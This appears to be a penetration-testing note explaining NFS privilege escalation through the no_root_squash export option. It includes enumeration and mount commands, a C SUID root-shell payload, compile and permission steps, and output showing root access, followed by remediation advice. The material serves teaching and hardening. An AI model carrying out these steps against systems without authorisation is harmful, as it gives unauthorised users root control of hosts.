# NFS Privilege Escalation via `no_root_squash`

## Overview

Privilege escalation isn't limited to local misconfigurations — network services like NFS,
SSH, and Telnet can also expose paths to root. This note documents the `no_root_squash`
NFS misconfiguration, a well-known technique in penetration testing engagements.

## Background: NFS Export Configuration

NFS share configuration lives in `/etc/exports`, created during NFS server installation.
This file is often world-readable, making it a useful enumeration target.

```bash
cat /etc/exports
```

Example output:

```
/tmp              *(rw,sync,insecure,no_root_squash,no_subtree_check)
/mnt/sharedfolder *(rw,sync,insecure,no_subtree_check)
/backups          *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

### Key option: `no_root_squash`

By default, NFS applies **root squashing** — remote root is mapped to `nfsnobody`,
stripping root privileges from files created by a root client. If `no_root_squash`
is set on a writable share, a client connecting as root retains root ownership over
files it creates on that share. This is the misconfiguration we exploit.

Other relevant options:
- `rw` — share is writable
- `insecure` — allows connections from ports above 1024
- `no_subtree_check` — disables subtree checking (performance/security tradeoff, not directly exploitable)

## Exploitation Steps

### 1. Enumerate exported shares

From the attacking machine:

```bash
showmount -e <MACHINE_IP>
```

```
Export list for MACHINE_IP:
/backups          *
/mnt/sharedfolder *
/tmp              *
```

### 2. Mount a `no_root_squash` share

```bash
mkdir /tmp/backupsonattackermachine
mount -o rw <MACHINE_IP>:/backups /tmp/backupsonattackermachine
cd /tmp/backupsonattackermachine
```

### 3. Write a SUID shell payload

```c
// nfs.c
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

### 4. Compile and set the SUID bit

```bash
gcc nfs.c -o nfs -w -static
chmod +s nfs
```

Verify ownership and permissions — the binary must be owned by `root:root`:

```bash
ls -l nfs
# -rwsr-sr-x 1 root root 16712 Jun 17 16:24 nfs
```

Because the share has `no_root_squash`, the file retains root ownership even though
it was created by a "remote root" client.

### 5. Trigger the exploit on the target

Since the share is mounted, the file is already visible on the target system at the
corresponding local path (e.g. `/backups`).

```bash
john@nfs-box:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)

john@nfs-box:/backups$ ls -l
-rwsr-sr-x 1 root root 16712 Jun 17 16:24 nfs
-rw-r--r-- 1 root root    76 Jun 17 16:24 nfs.c

john@nfs-box:/backups$ ./nfs
root@nfs-box:~# id
uid=0(root) gid=0(root) groups=0(root),...
```

The SUID bit plus root ownership means the binary executes with root privileges
regardless of the invoking user.

## Why This Works

1. `no_root_squash` lets the attacker's "root" client identity persist on the share.
2. A SUID root binary, once created, keeps its privileges when executed by *any*
   local user on the target — SUID execution runs with the *file owner's* privileges,
   not the invoking user's.
3. `system("/bin/bash")` inside a SUID-root binary spawns a root shell.

## Detection & Remediation

- **Enable `root_squash`** (the default) unless there is a specific, documented reason
  to disable it. Avoid `no_root_squash` on writable shares entirely where possible.
- **Restrict export scope**: avoid `*` as the allowed host list; specify exact IPs/hostnames.
- **Avoid `insecure`**: require connections from privileged ports (<1024) where feasible.
- **Restrict `/etc/exports` readability** if it reveals sensitive share layouts.
- **Monitor for unexpected SUID binaries** on mounted/shared filesystems as part of
  routine host auditing (e.g. `find / -perm -4000 -type f` on a schedule).
- **Network segmentation**: NFS traffic and `showmount` enumeration should not be
  reachable from untrusted network segments.

## Related Escalation Vectors (for reference)

- **SSH/Telnet**: root private keys found on a compromised host can sometimes be
  used to authenticate directly as root via SSH, rather than escalating privilege
  locally.
- **Misconfigured network backup/shell systems**: similar in spirit — a trusted
  automation or backup process running with elevated privileges can sometimes be
  hijacked if its configuration or scripts are writable by a lower-privileged user.

## References

- `exports(5)` man page
- General NFS security hardening guides (distro-specific, e.g. Debian/Ubuntu NFS docs)
